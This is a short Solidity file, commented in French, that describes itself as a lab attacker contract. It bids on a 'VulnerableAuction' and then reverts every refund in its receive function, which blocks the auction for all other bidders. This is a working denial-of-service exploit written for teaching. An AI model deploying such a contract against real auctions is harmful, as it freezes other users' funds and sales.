// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerableAuction} from "./VulnerableAuction.sol";

/// @title Attacker
/// @notice Contrat malveillant de laboratoire : prend la tête de l'enchère puis
///         refuse tout remboursement, ce qui bloque l'enchère pour tout le monde.
contract Attacker {
    VulnerableAuction public auction;

    constructor(address _auction) {
        auction = VulnerableAuction(_auction);
    }

    function attack() external payable {
        auction.bid{value: msg.value}();
    }

    /// Quand l'enchère essaie de me rembourser, je fais échouer la transaction.
    receive() external payable {
        revert("Je refuse le remboursement");
    }
}
